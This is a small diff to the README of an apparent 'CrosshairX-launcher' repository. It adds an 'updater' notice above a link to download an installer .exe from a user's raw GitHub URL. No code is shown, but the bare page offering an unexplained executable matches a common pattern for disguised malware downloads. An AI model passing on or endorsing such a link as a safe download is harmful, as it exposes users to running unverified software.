@@ -1,3 +1,5 @@
+IM WORKING ON UPDATER PLEASE WAIT...
+
 # CrosshairX-launcher
 <a href="https://raw.githubusercontent.com/GODMASTER841/CrosshairX-launcher/main/CrosshairX%20launcher%20Installer.exe">Click here for Download</a>
 
